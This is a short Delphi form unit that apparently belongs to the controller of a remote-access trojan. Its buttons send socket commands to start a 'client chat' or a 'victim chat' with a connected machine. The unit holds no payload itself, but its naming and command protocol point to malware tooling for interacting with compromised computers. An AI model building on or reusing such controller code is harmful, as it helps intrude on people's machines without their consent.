unit PickChatUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls;

type
  TPickChatForm = class(TForm)
    Panel1: TPanel;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    procedure Button3Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  PickChatForm: TPickChatForm;

implementation

uses Unit2;

{$R *.DFM}

procedure TPickChatForm.Button3Click(Sender: TObject);
begin
 close;
end;

procedure TPickChatForm.Button1Click(Sender: TObject);
begin
 Close;
 Form1.Status.Caption:='initiating client chat...';
 Form1.ClientSocket.Socket.SendText('OCC'+Form1.NickName);
end;

procedure TPickChatForm.Button2Click(Sender: TObject);
begin
 Close;
 Form1.Status.Caption:='initiating victim chat...';
 Form1.ClientSocket.Socket.SendText('OVC'+Form1.SendSettings);
 Form1.UseMySettings:=True;
end;

end.
